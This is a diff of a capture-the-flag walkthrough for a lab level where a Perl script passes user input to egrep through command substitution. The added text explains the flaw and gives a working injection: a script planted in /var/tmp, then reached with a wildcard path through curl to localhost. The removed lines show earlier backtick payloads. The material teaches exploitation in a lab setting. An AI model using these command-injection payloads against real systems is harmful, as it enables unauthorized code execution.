@@ -1,11 +1,13 @@
-GET /?x=$\($_[1]\)&y=echo+\(getflag\)
+## Walkthrough :
 
-egrep "^`echo $(getflag) > /var/tmp/flag`" /tmp/xd 2>&1
-GET /?x=$\($_[1]\)&y=`echo+$\(getflag\)+>+/var/tmp/flag`
-
-GET /?x=\$nn&y=\`echo+hello>/var/tmp/flag\`https://users.cs.cf.ac.uk/dave/PERL/node87.html
-
-
++ This level contain a perl script, that takes two args, (second is not used)
++ it capitalizes the first arguments, than it remove everythings after the first space if found.
++ it passes the variable to egrep, which get executed using a command substitution 
++ i created the script bellow :
+```
 echo "getflag >> /var/tmp/flag" >> /var/tmp/SCR && chmod 777 /var/tmp/SCR
-export A='`/*/*/SCR`'
-curl localhost:4646/?x=$A && cat /var/tmp/flag
+```
++ and passes it to the perl script using this Command :
+```
+curl localhost:4646/?x='`/*/*/SCR`' && cat /var/tmp/flag
+```
